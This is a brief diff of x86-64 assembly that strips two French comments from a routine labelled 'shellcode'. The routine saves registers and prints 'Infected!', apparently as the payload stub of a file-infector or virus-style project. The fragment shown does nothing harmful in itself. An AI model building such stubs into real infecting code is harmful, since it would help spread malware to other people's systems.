@@ -15,14 +15,12 @@ section .text
     global _start
 
 shellcode:
-    ; Réduire les sauvegardes de registres au minimum nécessaire
     push rax
     push rcx
     push rdx
     push rsi
     push rdi
 
-    ; Affiche "Infected!"
     mov rax, 1              
     mov rdi, 1              
     lea rsi, [rel msg]      
